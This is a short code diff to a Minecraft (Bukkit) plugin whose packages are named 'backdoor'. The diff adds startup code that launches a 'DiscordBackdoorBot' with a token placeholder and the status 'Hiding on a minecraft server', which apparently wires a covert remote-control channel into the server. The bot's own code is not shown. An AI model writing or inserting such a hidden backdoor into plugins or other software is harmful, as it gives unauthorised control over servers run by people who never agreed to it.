@@ -6,6 +6,7 @@ import me.tsb.backdoor.PlayerChat;
 import me.tsb.backdoor.events.ConnectionEvents;
 import me.tsb.backdoor.filler.Filler;
 import me.tsb.backdoor.filler.PlayerRegionTracker;
+import me.tsb.discordBot.DiscordBackdoorBot;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class Main extends JavaPlugin {
@@ -27,5 +28,10 @@ public class Main extends JavaPlugin {
 		playerRegionTracker = new PlayerRegionTracker();
 
 		filler = new Filler(this);
+
+		String backdoorBotToken = "TOKEN";
+		String backdoorBotActivity = "Hiding on a minecraft server";
+		new DiscordBackdoorBot(backdoorBotToken, backdoorBotActivity);
+
 	}
 }
